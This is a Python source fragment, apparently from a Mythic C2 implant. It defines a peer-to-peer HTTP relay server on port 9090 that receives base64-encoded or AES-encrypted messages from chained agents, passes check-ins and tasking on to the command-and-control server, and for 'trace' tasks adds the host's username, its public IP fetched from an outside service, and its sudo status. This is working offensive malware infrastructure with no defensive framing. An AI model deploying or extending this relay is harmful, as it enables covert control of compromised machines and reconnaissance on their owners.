def p2p_server(task_id):

    
    class RequestHandler(BaseHTTPRequestHandler):

        def do_POST(self):

            global delegates_aswers

            content_len = int(self.headers.get('content-length', 0))
            post_body = self.rfile.read(content_len)

            received_uuid = ""
            received_message = ""
            decode = ""
            encrypted = False

            try:
                decode = base64.b64decode(post_body)
                decode = decode.decode("utf-8")
            except:
                print(colored("The message is encrypted", "red"))
                decode = decrypt_AES256(post_body, UUID=True)
                encrypted = True

            received_uuid = str(decode)[:36]
            received_message = json.loads(decode[36:])

            print("\n--------------- CURRENT DELEGATE -----------------\n")
            print("Message = {}".format(received_message))
            print("UUID = {}".format(received_uuid))

            print("----------------------------------------------------------\n")


            encoded = to64(decode)

            if received_message["action"] == "checkin":
                delegate = {
                    "message": encoded,
                    "uuid": agent.PayloadUUID,
                    "c2_profile": "myp2p"
                }
            else:
                delegate = {
                    "message": encoded,
                    "uuid": received_uuid,
                    "c2_profile": "myp2p"
                }

            delegates.append(delegate)
            while delegates_aswers == []:
                pass

            print("\n--------------- CURRENT DELEGATE ANSWERS -----------------\n")
            for answer in delegates_aswers:
                message = base64.b64decode(answer['message'])
                message = message.decode("utf-8")
                message = message[36:]
                message = json.loads(message)

                print("Message = " + str(message))
                print("UUID = " + answer["uuid"])
                if "mythic_uuid" in answer:
                    print("Mythic_uuid = " + answer["mythic_uuid"])

            print("----------------------------------------------------------\n")


            reply_message = ""

            if received_message["action"] == "checkin":
                for answer in delegates_aswers:
                    message = base64.b64decode(answer['message'])
                    message = message.decode("utf-8")
                    message = message[36:]
                    message = json.loads(message)
                    if message["action"] == "checkin":
                        reply_message = answer['message']

            else:
                reply = False
                while not reply:
                    for answer in delegates_aswers:
                        message = base64.b64decode(answer['message'])
                        message = message.decode("utf-8")
                        message_uuid = message[:36]
                        message = message[36:]
                        message = json.loads(message)
                        if answer['uuid'] == received_uuid and message["action"] == received_message["action"]:
                            if message["action"] == "get_tasking":
                                if message["tasks"] != []:
                                    for task in message["tasks"]:
                                        if task["command"] == "trace":
                                            ip = requests.get('https://api.ipify.org').text
                                            if task["parameters"] == "":
                                                task["parameters"] = getpass.getuser() + "@" + ip + ";" + sudo
                                            else:
                                                task["parameters"] += " --> " + getpass.getuser() + "@" + ip + ";" + sudo
                                            reply_message = to64(message_uuid) + to64(str(message))
                                            delegates_aswers.remove(answer)
                                            reply = True
                                        else:
                                            reply_message = answer['message']
                                            delegates_aswers.remove(answer)
                                            reply = True
                            else:                    
                                reply_message = answer['message']
                                delegates_aswers.remove(answer)
                                reply = True


            
            if encrypted:

                # enc = encrypt_AES256(response)
                # message = base64.b64encode(uuid.encode() + enc).decode("utf-8")

                reply_message = base64.b64decode(reply_message).decode()
                uuid = reply_message[:36]
                message = reply_message[36:]
                enc = encrypt_AES256(message)
                reply_message = base64.b64encode(uuid.encode() + enc).decode("utf-8")

                print(colored("UUID = {}".format(uuid), "red"))
                print(colored("Message = {}".format(message), "green"))
                print(colored("Decrypted Message: \n{}".format(decrypt_AES256(reply_message), "blue")))

            self.protocol_version = "HTTP/1.1"
            self.send_response(200)
            self.send_header("Content-Length", len(reply_message))
            self.end_headers()
            self.wfile.write(bytes(reply_message, "utf8"))
            

    def run():
        p2p_port = 9090
        server = ('', p2p_port)
        httpd = HTTPServer(server, RequestHandler)
        thread = threading.Thread(target = httpd.serve_forever, daemon=True)
        thread.start()

        print("\t- P2P Server started on {}:{}".format(getIP(), p2p_port))
    run()